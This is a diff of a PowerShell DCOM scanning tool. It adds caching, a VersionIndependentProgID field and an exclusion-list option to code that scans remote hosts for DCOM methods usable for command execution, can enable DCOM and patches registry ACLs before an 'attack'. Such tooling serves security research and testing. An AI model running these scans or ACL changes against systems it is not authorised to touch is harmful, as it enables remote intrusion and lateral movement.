@@ -113,9 +113,9 @@ Function Write-Log {
         return
     }
     if($Level -eq "ERROR") {
-        Write-Warning $Line;
+        Write-Warning $Line
     } else {
-        Write-Host $Line;
+        Write-Host $Line
     }
     
     $global:LogStream.WriteLine($Line)|Out-Null
@@ -607,8 +607,8 @@ function Get-userSID {
 
     
     
-    if(Find-InArray -Content $Username -Array $global:UserSIDList.Keys) {
-        return $global:UserSIDList[$Username]
+    if(Find-InArray -Content $Username -Array $global:CachedData['UserSIDList'].Keys) {
+        return $global:CachedData['UserSIDList'][$Username]
     }
 
     # If the user that needs to be analyzed is in the same domain environment, try to resolve the groups using ASDI protocol
@@ -616,7 +616,7 @@ function Get-userSID {
     $SID = Get-UserSIDUsingADSI -RemoteIP $RemoteIP -Username $Username
     if($SID) {
         Write-Log -Level VERBOSE -Message "$($Username) resolved user SID using ADSI"
-        $global:UserSIDList[$Username] = $SID
+        $global:CachedData['UserSIDList'][$Username] = $SID
         return $SID
     }
     
@@ -628,7 +628,7 @@ function Get-userSID {
                 $SID = ([System.Security.Principal.WindowsIdentity]($Username)).User.Value
             }
             Write-Log -Level VERBOSE -Message "$($Username) Resolved identity SID using WindowsIdentity"
-            $global:UserSIDList[$Username] = $SID
+            $global:CachedData['UserSIDList'][$Username] = $SID
             return $SID
         } catch {
             Write-Log -Level ERROR -Message $_ -forceVerbose
@@ -651,22 +651,22 @@ function Get-GroupSID {
         [string]$GroupName
     )
     # This function is responsible to resolve the group SID using NTAccount feature, if it fails, it will try to produce it using ADSI protocool
-    if(Find-InArray -Content $GroupName -Array $global:GroupSIDList.Keys) {
-        return $global:GroupSIDList[$GroupName]
+    if(Find-InArray -Content $GroupName -Array $global:CachedData['GroupSIDList'].Keys) {
+        return $global:CachedData['GroupSIDList'][$GroupName]
     }
 
     # If fails, or the user is not domained-joined, try to resolve groups using ASDI protocol.
     $SID = Get-GroupSIDUsingADSI -RemoteIP $RemoteIP -GroupName $GroupName
     if($SID) {
         Write-Log -Level VERBOSE -Message "${GroupName} Group Resolved SID using ADSI"
-        $global:GroupSIDList[$GroupName] = $SID
+        $global:CachedData['GroupSIDList'][$GroupName] = $SID
         return $SID
     }
 
     try {
         $SID = ([System.Security.Principal.NTAccount]($GroupName)).Translate([security.principal.securityidentifier]).Value
         Write-Log -Level VERBOSE -Message "${GroupName} Group Resolved SID using NTAccount"
-        $global:GroupSIDList[$GroupName] = $SID
+        $global:CachedData['GroupSIDList'][$GroupName] = $SID
         return $SID
     } catch {
     Write-Log -Level ERROR -Message $_
@@ -690,7 +690,7 @@ function Get-UserGroupsUsingWindowsIdentity {
             if($groupName.Contains("NT AUTHORITY\") -or ($groupName -ceq $groupName.ToUpper())) {
                 continue
             }
-            $global:GroupSIDList[$GroupName] = $sid.Value
+            $global:CachedData['GroupSIDList'][$GroupName] = $sid.Value
             %{ $sid.Value }
         
         } catch {
@@ -1337,7 +1337,7 @@ function Get-ObjMember {
     
 }
 
-function Get-Object-Info {
+function Get-ObjectMembers {
     [OutputType([System.array])]
     param(
         [string]$ObjectPath,
@@ -1347,7 +1347,6 @@ function Get-Object-Info {
     try {
 
         $status, $results = Get-ObjMember -ObjectPath $ObjectPath
-
         $items = New-Object System.Collections.ArrayList
         if(!$status) {
             return $false, $results
@@ -1966,15 +1965,13 @@ function Start-DefaultTasks {
             # Queue objects
             $global:Consumer = [System.Collections.Queue]::Synchronized( (New-Object System.Collections.Queue) ) # Collects results from namedpipe
             $global:Producer = [System.Collections.Queue]::Synchronized( (New-Object System.Collections.Queue) ) # Sends commands to namedpipe
-            $global:UserSIDList = @{}
-            $global:GroupSIDList = @{}
+
+
             $global:VulnerableFunctionList = New-Object System.Collections.ArrayList # Exacts vulenrable function names
             $global:VulnerableMatchList = New-Object System.Collections.ArrayList # Vulnerable Functions patterns(contains "*")
             $global:StopWatch = New-Object -TypeName System.Diagnostics.Stopwatch # Configure stop watch
             $global:StopWatch.Start()
             $global:isNamedpipeStarted = $false
-            $global:totalResults = @{} # Count total results for each object
-            $global:CachedObjectList = @{} # Cached DCOM object information list
             $global:isResultsExists = $false # A flag that indicates if there is results.
             $global:isNamedpipeStarted = $false
         }
@@ -1983,16 +1980,25 @@ function Start-DefaultTasks {
             # Clear namedpipe queues
             $global:Consumer.Clear()|Out-Null
             $global:Producer.Clear()|Out-Null
-            $global:UserSIDList.Clear()|Out-Null
-            $global:GroupSIDList.Clear()|Out-Null
+            $global:CachedData = @{
+                'UserSIDList'= @{}; # Cached User SID list
+                'GroupSIDList' = @{}; # Cached Group SID list
+                'CachedObjectList' = @{} # Cached DCOM object information list
+                'totalResults' = @{} # Counts how many functions marked as vulnerable, on each object
+                'AppIDPathList' = @{} # Store AppID path for each CLSID
+                'aclSnapshots' = New-Object System.Collections.ArrayList # ACLs snapshot list in order to store SDDL snapshots for each registry key (For further reverting operation to the previous machine state)
+                'ProgIDToCLSIDList' = @{} # Cached translation of ProgID To CLSID
+                'CLSIDToProgIDList' = @{} # Cached translation of CLSID To ProgID
+                'CLSIDToVersionIndependentProgIDList' = @{} # Cached translation of CLSID To VersionIndependentProgID
+                'CLSIDToProgDataList' = @{}
+            }
+            
             $global:ChoosenHive = ""
             $global:RemoteDomain = $null
             $global:RegAuthenticationMethod = $null
             $global:IsDCOMStatusChanged = $false # If DCOM Is not enabled on the machine and we enable it, restore it
-            $global:aclSnapshots = New-Object System.Collections.ArrayList # ACLs snapshot list in order to store SDDL snapshots for each registry key (For further reverting operation to the previous machine state)
-            $global:AppIDPathList = New-Object @{} # Store AppID path for each CLSID
-            $global:totalResults.Clear() # Clear total results
-            $global:CachedObjectList.Clear() # Clear cached DCOM object information list
+            
+            
             if(!(Start-NamedPipe-Server -Username $Username -Password $Password)) { # Initiate namedpipe server
                 return $false 
             }
@@ -2114,7 +2120,7 @@ function Add-ResultRow {
         
         # If we have previous results file, don't add headers.
         if(!$global:isResultsExists) {
-            $global:ResultsStream.WriteLine((Convert-ArrayToCSVRow -ArrayList @('Remote IP', 'ProgName', 'CLSID', 'ProgID', 'Path', 'Execution Command (CLSID)', 'Execution Command (ProgID)', 'Library (32bit)', 'Library (64bit)')))
+            $global:ResultsStream.WriteLine((Convert-ArrayToCSVRow -ArrayList @('Remote IP', 'ProgName', 'CLSID', 'ProgID', 'VersionIndependentProgID', 'Path', 'Execution Command (CLSID)', 'Execution Command (ProgID)', 'Library (32bit)', 'Library (64bit)')))
         }
     }
 
@@ -2136,36 +2142,34 @@ Function Add-Result {
         [switch]$SkipRegAuth
     )
     # This function is responsible to collect and store the results
-
     if($SkipRegAuth) {
         if(is-GUID -ObjectName $ObjectName) {
-            $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = @($ObjectName, "", "", "", "")
+            $clsid, $ProgID, $VersionIndependentProgID, $ProgName, $Library_32, $Library_64 = @($ObjectName, "", "", "", "", "")
         } else {
-            $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = @("", $ObjectName, "", "", "")
+            $clsid, $ProgID, $VersionIndependentProgID, $ProgName, $Library_32, $Library_64 = @("", $ObjectName, "", "", "", "")
         }
     } else {
-        $clsid, $ProgID, $ProgName, $Library_32, $Library_64 = Get-ObjectInfo -ObjectName $ObjectName # Collect object info
-    }
-    ForEach($handleType in @("ProgID", "CLSID")) {  # Generates execution commands
-        if($CheckAccessOnly) { # If CheckAccessOnly mode is on, dont try to get invoke command (Duo to the fact e dont have the object path)
-            Set-Variable -Name "$($handleType)Command" -Value ""
-            continue
-        }
-        $objName = Get-Variable -Name $handleType -ValueOnly
-        if(!$objName) {
-            continue
-        }
-        $cmd = _Generate-ExecutionCommand -ObjectName $objName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
-        Set-Variable -Name "$($handleType)Command" -Value $cmd
+        $clsid, $ProgID, $VersionIndependentProgID, $ProgName, $Library_32, $Library_64 = Get-ObjectInfo -ObjectName $ObjectName # Collect object info
     }
 
-    if(!(Find-InArray -Content $ObjectName -Array $global:totalResults.Keys)) { # If the object does not have results, create a new counter for it.
-        $global:totalResults[$ObjectName] = 0
+    $CLSIDCommand = ""
+    $ProgIdCommand = ""
+    if($OverloadDefinitions) {
+        if($CLSID) {
+            $CLSIDCommand = _Generate-ExecutionCommand -ObjectName $CLSID -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
+        }
+        if($ProgID) {
+            $ProgIdCommand = _Generate-ExecutionCommand -ObjectName $ProgID -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
+        }
+    }
+
+    if(!(Find-InArray -Content $ObjectName -Array $global:CachedData['totalResults'].Keys)) { # If the object does not have results, create a new counter for it.
+        $global:CachedData['totalResults'][$ObjectName] = 0
     }
     
-    $global:totalResults[$ObjectName] += 1 # Count results for each DCOM object
+    $global:CachedData['totalResults'][$ObjectName] += 1 # Count results for each DCOM object
     # Add result row
-    Add-ResultRow -ResultRow @($RemoteIP, $progName, $clsid, $ProgID, $ObjectPath, $CLSIDCommand, $ProgIdCommand, $Library_32, $Library_64)
+    Add-ResultRow -ResultRow @($RemoteIP, $progName, $clsid, $ProgID, $VersionIndependentProgID, $ObjectPath, $CLSIDCommand, $ProgIdCommand, $Library_32, $Library_64)
     if(!$CheckAccessOnly) {
         Write-Log -Level INFO -Message "$($ObjectName).$($ObjectPath) Found!"
     }
@@ -2281,6 +2285,32 @@ function Find-VulnerableFunction {
     return $false
 }
 
+function Find-ExcludePattern {
+    [OutputType([System.Boolean])]
+    param
+    (
+        [Parameter(Mandatory = $true)]
+        [string]$CLSID,
+        [string]$ProgID,
+        [string]$VersionIndependentProgID,
+        [Parameter(Mandatory = $true)]
+        [System.Array]$ExcludeFileContent
+    )
+
+    # This function is responsible to find patterns from the exclusion list.
+    foreach($ObjectTypeName in @($CLSID, $ProgID, $VersionIndependentProgID)) {
+        if(!$ObjectTypeName) { # Skip empty values
+            continue
+        }
+        foreach($ExcludedPattern in $ExcludeFileContent) {
+            if($ObjectTypeName -like $ExcludedPattern) {
+                return $true                    
+            }
+        }
+    }
+    return $false
+}
+
 function Check-TCPConnection {
     [OutputType([System.Boolean])]
     param
@@ -2315,8 +2345,8 @@ function is-MaxResultsReached {
     if(!$MaxResults) {
         return $false
     }
-    if(Find-InArray -Content $ObjectName -Array $global:totalResults.Keys) { # Check if we have collected results
-        if($global:totalResults[$ObjectName] -ge $MaxResults) { # Check if we have reached the maximum of results
+    if(Find-InArray -Content $ObjectName -Array $global:CachedData['totalResults'].Keys) { # Check if we have collected results
+        if($global:CachedData['totalResults'][$ObjectName] -ge $MaxResults) { # Check if we have reached the maximum of results
             Write-Log -Level VERBOSE -Message "Max results for $($ObjectName) has been reached"
             return $true
         }
@@ -2657,10 +2687,86 @@ function Get-CLSID {
         [string]$ProgID
     )
     # This function is responsible to Convert ProgID to CLSID
+    if(Find-InArray -Content $ProgID -Array $global:CachedData['ProgIDToCLSIDList'].Keys) {
+        return $global:CachedData['ProgIDToCLSIDList'][$ProgID]
+    }
     foreach($pathLoc in @('SOFTWARE\Classes', 'SOFTWARE\Classes\WOW6432Node')) {
-        $clsid = Read-RegString -Key "$($pathLoc)\$($ProgID)\CLSID" -Value ""
-        if($clsid) {
-            return Wrap-CLSID -ObjectName $clsid
+        $CLSID = Read-RegString -Key "$($pathLoc)\$($ProgID)\CLSID" -Value ""
+
+        if($CLSID) {
+            $global:CachedData['ProgIDToCLSIDList'][$ProgID] = Wrap-CLSID -ObjectName $CLSID 
+            return $global:CachedData['ProgIDToCLSIDList'][$ProgID]
+        }
+    }
+    return ""
+}
+
+function Get-ProgName {
+    [CmdletBinding(SupportsShouldProcess=$true)]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$CLSID
+    )
+    if(Find-InArray -Content $CLSID -Array $global:CachedData['CLSIDToProgDataList'].Keys) {
+        return $global:CachedData['CLSIDToProgDataList'][$CLSID]
+    }
+    foreach($RegPath in @("SOFTWARE\Classes\Wow6432Node\CLSID\$($CLSID)", "SOFTWARE\Classes\CLSID\$($CLSID)")) {
+        $ProgName = Read-RegString -Key $RegPath -Value ""
+        if($ProgName) {
+            $global:CachedData['CLSIDToProgDataList'][$CLSID] = $ProgName
+            return $ProgName
+        }
+    }
+    $global:CachedData['CLSIDToProgDataList'][$CLSID] = ""
+    return ""
+}
+
+function Get-DCOMFileImplementation {
+    [CmdletBinding(SupportsShouldProcess=$true)]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$CLSID,
+        [switch]$Is64
+    )
+    $RegLocation = Iif -Condition $Is64 -Right "SOFTWARE\Classes\Wow6432Node\CLSID\$($CLSID)" -Wrong "SOFTWARE\Classes\CLSID\$($CLSID)"
+    $CLSIDKeyNames = Get-RegKeyName $($RegLocation)
+    # Find the library file on the InProcServer32 key, otherwise, continue to find it on the LocalServer32 key
+            
+    foreach($LibraryName in @("InProcServer32", "LocalServer32")) {
+        if(!(Find-InArray -Content $LibraryName -Array $CLSIDKeyNames)) {
+            continue
+        }
+        $LibraryLocation = Read-RegString -Key "$($RegLocation)\$($LibraryName)" -Value ""
+        if($LibraryLocation) {
+            return $LibraryLocation
+        }
+    }
+            
+    return ""
+}
+
+function Get-ProgID {
+    [CmdletBinding(SupportsShouldProcess=$true)]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$CLSID,
+        [switch]$isVersionIndependent
+    )
+    # This function is responsible to Convert CLSID to ProgID
+    $ProgIDType = Iif -Condition $isVersionIndependent -Right 'VersionIndependentProgID' -Wrong 'ProgID'
+    $CacheObjectName = "CLSIDTo$($ProgIDType)List"
+    if(Find-InArray -Content $CLSID -Array $global:CachedData[$CacheObjectName].Keys) {
+        return $global:CachedData[$CacheObjectName][$CLSID]
+    }
+    
+    foreach($pathLoc in @('SOFTWARE\Classes\CLSID', 'SOFTWARE\Classes\WOW6432Node\CLSID')) {
+        $ProgID = Read-RegString -Key "$($pathLoc)\$($CLSID)\$($ProgIDType)" -Value ""
+        if($ProgID) {
+            $global:CachedData[$CacheObjectName][$CLSID] =  Read-RegString -Key "$($pathLoc)\$($CLSID)\$($ProgIDType)" -Value ""
+            return $global:CachedData[$CacheObjectName][$CLSID]
         }
     }
     return ""
@@ -2678,53 +2784,22 @@ function Get-ObjectInfo {
 
     # If the objectname is a ProgID, retrieve the CLSID in order to continue fetch information using it.
     if(is-GUID -ObjectName $ObjectName) {
-        $clsid, $ProgID = @((Wrap-CLSID -ObjectName $ObjectName), "")
+        $CLSID = Wrap-CLSID -ObjectName $ObjectName
     } else {
-        $clsid, $ProgID = @((Get-CLSID -ProgID $ObjectName), $ObjectName)
+        $CLSID = Get-CLSID -ProgID $ObjectName
     }
     
     # In order to reduce registry calls, this operation will cache each object information in a general dictionary.
-    if(!(Find-InArray -Content $clsid -Array $global:CachedObjectList.Keys)) {
-        Write-Log -Level VERBOSE -Message "Fetching program information of $($clsid) Object"
-        $archList = @(
-                        @{"Arch"="32"; "Path"="SOFTWARE\Classes\CLSID\$($clsid)"},
-                        @{"Arch"="64";"Path"="SOFTWARE\Classes\Wow6432Node\CLSID\$($clsid)"}
-                    )
-        $Library_32, $Library_64 = @("", "")
-        foreach($archInfo in $archList) {
-            $CLSIDValueNames = Get-RegValueName -Key $($archInfo.Path)
-            $CLSIDKeyNames = Get-RegKeyName $($archInfo.Path)
-
-            if(!$ProgID -and (Find-InArray -Content "VersionIndependentProgID" -Array $CLSIDKeyNames)) {
-                $ProgID = Read-RegString -Key "$($archInfo.Path)\VersionIndependentProgID" -Value ""
-            }
-            if(!$ProgName  -and (Find-InArray -Content "" -Array $CLSIDValueNames)) {
-                $ProgName = Read-RegString -Key  $archInfo.Path -Value ""
-            }
-            
-            # Find the library file on the InProcServer32 key, otherwise, continue to find it on the LocalServer32 key
-            
-            foreach($LibraryName in @("InProcServer32", "LocalServer32")) {
-                if(!(Find-InArray -Content $LibraryName -Array $CLSIDKeyNames)) {
-                    continue
-                }
-                $LibraryLocation = Read-RegString -Key "$($archInfo.Path)\$($LibraryName)" -Value ""
-                if($LibraryLocation) {
-                    Set-Variable -Name "Library_$($archInfo.Arch)" -Value $LibraryLocation
-                }
-            }
-            
-            if(!(Get-Variable -Name "Library_$($archInfo.Arch)" -ValueOnly)) {
-                Set-Variable -Name "Library_$($archInfo.Arch)" -Value ""
-            }
-            
+    if(!(Find-InArray -Content $CLSID -Array $global:CachedData['CachedObjectList'].Keys)) {
+        $ProgID = Get-ProgID -CLSID $CLSID
+        $VersionIndependentProgID = Get-ProgID -CLSID $CLSID -isVersionIndependent
+        $ProgName = Get-ProgName -CLSID $CLSID
+        $Library_32 = Get-DCOMFileImplementation -CLSID $CLSID
+        $Library_64 = Get-DCOMFileImplementation -CLSID $CLSID -Is64
         
-        }
-        $global:CachedObjectList[$clsid] = @($clsid, $ProgID, $ProgName, $Library_32, $Library_64)
+        $global:CachedData['CachedObjectList'][$CLSID] = @($CLSID, $ProgID, $VersionIndependentProgID, $ProgName, $Library_32, $Library_64)
     }
-    return $global:CachedObjectList[$clsid]
-    
-    
+    return $global:CachedData['CachedObjectList'][$CLSID]
 
 }
 
@@ -2736,15 +2811,15 @@ function Get-AppIDPath {
         [string]$CLSID
     )
     # This function is responsible to resolve AppID path from CLSID
-    if(Find-InArray -Content $CLSID -Array $global:AppIDPathList.Keys) {
-        return $global:AppIDPathList[$CLSID]
+    if(Find-InArray -Content $CLSID -Array $global:CachedData['AppIDPathList'].Keys) {
+        return $global:CachedData['AppIDPathList'][$CLSID]
     }
     
     foreach($RegistryLocation in @("SOFTWARE\Classes", "SOFTWARE\Classes\Wow6432Node")) {
         $AppID = Read-RegString -Key "$($RegistryLocation)\CLSID\$($CLSID)" -Value "AppID"
         if($AppID) {
-            $global:AppIDPathList[$CLSID] = "$($RegistryLocation)\AppID\$($AppID)"
-            return $global:AppIDPathList[$CLSID]
+            $global:CachedData['AppIDPathList'][$CLSID] = "$($RegistryLocation)\AppID\$($AppID)"
+            return $global:CachedData['AppIDPathList'][$CLSID]
         }
     }
     return $false
@@ -2770,34 +2845,34 @@ function Get-DCOMObjectList {
     $ScannedList = New-Object System.Collections.ArrayList # Contains scanned list
 
     foreach($RegistryPath in (@('SOFTWARE\Classes\CLSID', 'SOFTWARE\Classes\WOW6432Node\CLSID'))) { # Collects CLSIDS from 64bit and 32bit library
-        foreach($clsid in (Get-RegKeyName -Key $RegistryPath| Sort-Object {Get-Random})) {
+        foreach($CLSID in (Get-RegKeyName -Key $RegistryPath| Sort-Object {Get-Random})) {
             
-            if(!(is-GUID -ObjectName $clsid)) { # If the clsid is not GUID, skip to the next one
+            if(!(is-GUID -ObjectName $CLSID)) { # If the clsid is not GUID, skip to the next one
                 continue
             }
 
-            if(Find-InArray -Content $clsid -Array $ScannedList) { # If the CLSID already scanned, skip to the next one.
+            if(Find-InArray -Content $CLSID -Array $ScannedList) { # If the CLSID already scanned, skip to the next one.
                 continue
             }
             
-            if(Find-InArray -Content $clsid -Array $AllAppIDs) { # If the clsid exists in the AppID list - it means the the CLSID is matched to the AppID
-                $ScannedList.Add($clsid)|Out-Null
-                %{ $clsid }
+            if(Find-InArray -Content $CLSID -Array $AllAppIDs) { # If the clsid exists in the AppID list - it means the the CLSID is matched to the AppID
+                $ScannedList.Add($CLSID)|Out-Null
+                %{ $CLSID }
                 continue
             }
 
             
-            if(!(Find-InArray "AppID" -Array (Get-RegValueName -Key "$($RegistryPath)\$($clsid)"))) { # If the CLSID does not contains AppID, it probably not a DCOM object
+            if(!(Find-InArray "AppID" -Array (Get-RegValueName -Key "$($RegistryPath)\$($CLSID)"))) { # If the CLSID does not contains AppID, it probably not a DCOM object
                 continue
             }
 
-            $AppID = Read-RegString -Key "$($RegistryPath)\$($clsid)" -Value "AppID"
+            $AppID = Read-RegString -Key "$($RegistryPath)\$($CLSID)" -Value "AppID"
             if(!(Find-InArray -Content $AppID -Array $AllAppIDs)) {  # If the AppID does not stored on the DCOM AppID list, skip to the next one.
                 continue
             }
 
-            $ScannedList.Add($clsid)|Out-Null
-            %{ $clsid }
+            $ScannedList.Add($CLSID)|Out-Null
+            %{ $CLSID }
             
         }
     }
@@ -2919,12 +2994,12 @@ function Rev2Self {
         Write-RegString -Key "SOFTWARE\Microsoft\Ole" -Value "EnableDCOM" -String "N"|Out-Null
         $global:IsDCOMStatusChanged = $false
     }
-    if($global:aclSnapshots.Count -eq 0) {
+    if($global:CachedData['aclSnapshots'].Count -eq 0) {
         Write-Log -Level VERBOSE -Message "No snapshots found." -forceVerbose
         return
     }
     Write-Log -Level INFO "Reverting to the previous snapshots.."
-    $global:aclSnapshots|ForEach {
+    $global:CachedData['aclSnapshots']|ForEach {
         $emptyACL = New-Object System.Security.AccessControl.RegistrySecurity # Create empty ACL
         $emptyACL.SetSecurityDescriptorSddlForm($_.SDDL) # Attach the previous SDDL
         $sdBytes = ($global:converter.SDDLToBinarySD($emptyACL.Sddl)).BinarySD # Convert to binary
@@ -2998,10 +3073,10 @@ function Invoke-SecurityRightAnalyzer {
                 Write-Log -Level ERROR -Message "Can't patch permissions for $($Path) (Access is denied)"
                 continue
             }
-            $global:aclSnapshots.Add(@{Path=$Path; Value=$record; SDDL=$ACL.sddl})|Out-Null # Store SDDL Before attack
+            $global:CachedData['aclSnapshots'].Add(@{Path=$Path; Value=$record; SDDL=$ACL.sddl})|Out-Null # Store SDDL Before attack
             if(!(Patch-ACL -ACL $ACL -Path $Path -Value $record)) { # If the patching operation fails, remove the last snapshot
                 Write-Log -Level ERROR "Patching $($Path)\$($record) permissions Failed" -forceVerbose
-                $global:aclSnapshots.RemoveAt($global:aclSnapshots.Count-1)| Out-Null
+                $global:CachedData['aclSnapshots'].RemoveAt($global:CachedData['aclSnapshots'].Count-1)| Out-Null
                 continue
             }
             Write-Log -Level VERBOSE "$($Path)\$($record) permissions patched successfully!"
@@ -3137,7 +3212,7 @@ function Get-UserGroupsUsingADSI {
     if([bool]$res.IsSuccess) {
         Write-Log -Level VERBOSE -Message "Resolved user groups using ADSI (Identity: $($Username))"
         $res.Result|Foreach {
-            $global:GroupSIDList[$_.GroupName] = $_.SID
+            $global:CachedData['GroupSIDList'][$_.GroupName] = $_.SID
             %{ $_.SID }
         }
         return
@@ -3180,11 +3255,11 @@ function Get-UserSIDUsingADSI {
 }
 
 
-function Get-Object-Info {
+function Get-ObjectMembers {
     param(
         [string]$ObjectPath
     )
-    $MissionInfo = @{FunctionName="Get-Object-Info"; Arguments=@{ObjectPath=$ObjectPath}}
+    $MissionInfo = @{FunctionName="Get-ObjectMembers"; Arguments=@{ObjectPath=$ObjectPath}}
     $res = Invoke-NamedpipeMission -MissionInfo $MissionInfo
     if([bool]$res.IsSuccess) {
         return [System.Array]$res.Result
@@ -3343,8 +3418,7 @@ function Invoke-DCOMAnalyzer {
         return
     }
     try {
-        $Blacklist = New-Object System.Collections.ArrayList # Path blacklist in order to prevent race conditions
-        Enumerate-DCOMObject -Blacklist $Blacklist -ObjectName $ObjectName -MaxDepth $MaxDepth -RemoteIP $RemoteIP -MaxResults $MaxResults -SkipRegAuth:$SkipRegAuth -SkipSameProperyName:$SkipSameProperyName|Out-Null
+        Enumerate-DCOMObject -Blacklist (New-Object System.Collections.ArrayList) -ObjectName $ObjectName -MaxDepth $MaxDepth -RemoteIP $RemoteIP -MaxResults $MaxResults -SkipRegAuth:$SkipRegAuth -SkipSameProperyName:$SkipSameProperyName|Out-Null
     } catch {
         Write-Log -Level ERROR -Message $_
     }
@@ -3381,11 +3455,11 @@ function Enumerate-DCOMObject {
                 return
             }
         }
-    
         if($($CurrentDepth) -ge $MaxDepth) { # if the max depth is reached, break the loop
             return
         }
-        foreach($MemberInfo in (Get-Object-Info -ObjectPath $FullObjectPath| Sort-Object {Get-Random})) {
+
+        foreach($MemberInfo in (Get-ObjectMembers -ObjectPath $FullObjectPath| Sort-Object {Get-Random})) {
             if(is-MaxResultsReached -ObjectName $ObjectName -MaxResults $MaxResults) { # If the max results is reached, break the loop.
                 return
             }
@@ -3466,6 +3540,11 @@ function Invoke-DCOMObjectScan {
         Specifies the function/method list file that contains:
         vulnerable function name (i.e. "execute") OR a function name patterns (i.e. "exec*")
         Note: PLEASE PROVIDE FULL PATH (i.e. c:\func_name_patterns.txt)
+
+        .PARAMETER ExcludeFileList
+        Specifies the exclude list of objects that you don't want to scan (Available only on "All" type).
+        You can Specify ProgID (e.g. MMC20.Application.1), VersionIndependentProgID (e.g. MMC20.Application), and CLSID (e.g. {49B2791A-B1AE-4C90-9B8E-E860BA07F889})
+        Also, you can specify a patten that contains a part of the ProgID/VersionIndependentProgID or CLSID (e.g. MMC* or {49B2791A*)
 
         .PARAMETER MaxResults
         Specifies the max amount of usable function within each scanned object
@@ -3551,9 +3630,9 @@ function Invoke-DCOMObjectScan {
 
         .EXAMPLE
 
-        Scans all the objects stored on the available remote machines from the 10.211.55.1/24 range and finds potential vulnerable functions from the list located on the selected file (e.g. C:\Users\USERNAME\Desktop\DVS\vulnerable.txt), and skip property with the same name on other routes on the same object.
+        Scans all the objects stored on the available remote machines from the 10.211.55.1/24 range and finds potential vulnerable functions from the list located on the selected file (e.g. C:\Users\USERNAME\Desktop\DVS\vulnerable.txt), exclude the objects on the selected file (e.g. "C:\Users\USERNAME\Desktop\DVS\exclude.txt"), and skip property with the same name on other routes on the same object.
         NOTE: The SkipSameProperyName flag might miss vulnerable functions when there is the same property name with different preferences(Methods/other properties) or different depth chain
-        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -Hostlist "10.211.55.1/24" -SkipSameProperyName -Verbose
+        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -ExcludeFileList "C:\Users\USERNAME\Desktop\DVS\exclude.txt" -Hostlist "10.211.55.1/24" -SkipSameProperyName -Verbose
     #>
     [CmdletBinding(SupportsShouldProcess=$true)]
     param
@@ -3564,6 +3643,7 @@ function Invoke-DCOMObjectScan {
         [ValidateSet("All","List","Single")]
         [string]$Type,
         [string]$FunctionListFile,
+        [string]$ExcludeFileList,
         [string]$ObjectListFile,
         [string]$ObjectName="",
         [string]$Username="",
@@ -3613,6 +3693,14 @@ function Invoke-DCOMObjectScan {
             }
         }
         $ScannedObjects = @{}
+        $ExcludeFileContent = @()
+        if($Type -eq "All" -and $ExcludeFileList) {
+            $ExcludeFileContent = Read-File -FileName $ExcludeFileList -AsArray
+            if(!$ExcludeFileContent) {
+                Write-Log -Level ERROR -Message "Can't Access Exclusion file! $($ExcludeFileList)"
+                return
+            }
+        }
         if($SaveState) {
             try {
                 if([System.IO.File]::Exists($global:ScanStateFileName)) {
@@ -3635,11 +3723,12 @@ function Invoke-DCOMObjectScan {
                     if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                         continue
                     }
-
+                    
                     if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
                         if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
                             Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
                             continue
+                        
                         }
 
                         if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
@@ -3670,18 +3759,35 @@ function Invoke-DCOMObjectScan {
                         }
                     }| ForEach {
                         $ObjectName = Wrap-CLSID -ObjectName $_
-                    
-                        if($SaveState) {
-                            if(!(Find-InArray -Content $RemoteIP -Array $ScannedObjects.Keys)) {
-                                $ScannedObjects[$RemoteIP] = New-Object System.Collections.ArrayList
-                            }
-                            if(Find-InArray -Content $RemoteIP -Array $ScannedObjects.Keys) {
-                                if(Find-InArray -Content $ObjectName -Array $ScannedObjects[$RemoteIP]) {
-                                    Write-Log -Level VERBOSE -Message "Skipping $($ObjectName) object!"
-                                    continue
-                                }
+                        if(!(Find-InArray -Content $RemoteIP -Array $ScannedObjects.Keys)) {
+                            $ScannedObjects[$RemoteIP] = New-Object System.Collections.ArrayList
+                        }
+                        if(Find-InArray -Content $RemoteIP -Array $ScannedObjects.Keys) {
+                            if(Find-InArray -Content $ObjectName -Array $ScannedObjects[$RemoteIP]) {
+                                Write-Log -Level VERBOSE -Message "Skipping $($ObjectName) object!"
+                                continue
                             }
                         }
+
+                        if($Type -eq "All" -and $ExcludeFileContent) {
+                            if(is-GUID -ObjectName $ObjectName) {
+                                $CLSID = Wrap-CLSID -ObjectName $ObjectName
+
+                            } else {
+                                $CLSID = Get-CLSID -ProgID $ObjectName
+                            }
+                            
+                            $ProgID = Get-ProgID -CLSID $CLSID
+                            $VersionIndependentProgID = Get-ProgID -CLSID $CLSID -isVersionIndependent
+
+                            if(Find-ExcludePattern -CLSID $CLSID -ProgID $ProgID -VersionIndependentProgID $VersionIndependentProgID -ExcludeFileContent $ExcludeFileContent) {
+                                Write-Log -Level VERBOSE -Message "Skipping Excluded object ProgID: $($ProgID) CLSID: $($CLSID)!"
+                                $ScannedObjects[$RemoteIP].Add($ObjectName)|Out-Null
+                                continue
+                            }
+                            
+                        }
+
                         if(!$SkipRegAuth -and !$SkipPermissionChecks) {
                             $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                             if(!$CLSIDChecks) {
@@ -3690,9 +3796,10 @@ function Invoke-DCOMObjectScan {
                                 continue
                             }
                         }
+
